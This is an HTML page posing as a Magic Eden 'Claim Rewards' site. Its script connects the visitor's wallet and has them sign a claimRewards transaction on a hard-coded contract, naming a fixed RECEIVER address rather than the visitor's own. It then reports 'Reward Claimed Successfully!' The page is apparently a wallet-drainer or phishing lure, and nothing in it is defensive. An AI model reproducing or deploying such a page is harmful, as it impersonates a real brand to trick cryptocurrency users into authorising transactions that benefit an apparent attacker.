<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>www.magiceden.io</title>
</head>
<body style="background:#111; color:#fff; font-family:Arial; padding:20px;">
    <h2>Claim Rewards</h2>

    <button id="claimBtn">Claim Rewards</button>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

    <script>
        const CONTRACT_ADDRESS = "0x0B3E87a076AC4B0d1975F0f232444af6DEb96c59";
        const RECEIVER = "0x00008f1149168c1d2fa1eba1ad3e9cd644510000";

        const ABI = [
            "function claimRewards(address user) public returns (bool)"
        ];

        document.getElementById("claimBtn").onclick = async () => {
            if (!window.ethereum) {
                alert("Magic Eden Wallet not detected!");
                return;
            }

            try {
                //Connect
                await window.ethereum.request({ method: "eth_requestAccounts" });

                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);

                // Auto call claimRewards()
                const tx = await contract.claimRewards(RECEIVER);
                console.log("TX sent:", tx.hash);
                alert("Transaction sent:\n" + tx.hash);

                const receipt = await tx.wait();
                console.log("Confirmed:", receipt);
                alert("Reward Claimed Successfully!");

            } catch (err) {
                console.error(err);
                alert("Error:\n" + err.message);
            }
        };
    </script>
</body>
</html>
